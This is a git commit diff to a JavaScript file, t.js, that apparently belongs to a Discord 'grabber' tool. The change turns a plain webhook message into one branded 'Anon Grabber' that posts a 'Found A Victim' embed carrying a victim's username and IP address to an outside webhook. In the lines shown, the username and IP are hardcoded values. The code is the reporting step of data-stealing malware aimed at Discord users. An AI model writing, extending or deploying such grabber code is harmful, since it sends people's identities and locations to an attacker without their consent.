e983509f31108e32057964cfafde87146b6c1ec9
wuddybuddy <123273718+wuddybuddy@users.noreply.github.com>
2023-04-16 01:17:25 -0500

    Update t.js

--- t.js
+++ t.js
@@ -5,8 +5,20 @@ var request = new XMLHttpRequest();
 request.open("POST", wh);
 request.setRequestHeader('Content-type', 'application/json');
 var params = {
-    username: "Hello World",
-    avatar_url: "https://miro.medium.com/max/500/1*DhlEHM0sZs1DKEoBc40ldQ.png",
-    content: msg,
+    username: "Anon Grabber",
+    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png",
+    embeds: [{
+        title: "Found A Victim",
+        description: "Found A victim on discord using Anon Grabber",
+        fields: [{
+            name: "Username",
+            value: "Zeth",
+            inline: !1
+        }, {
+            name: "IP",
+            value: "9.7.5.1",
+            inline: !1
+        }]
+    }],
 };
 request.send(JSON.stringify(params));
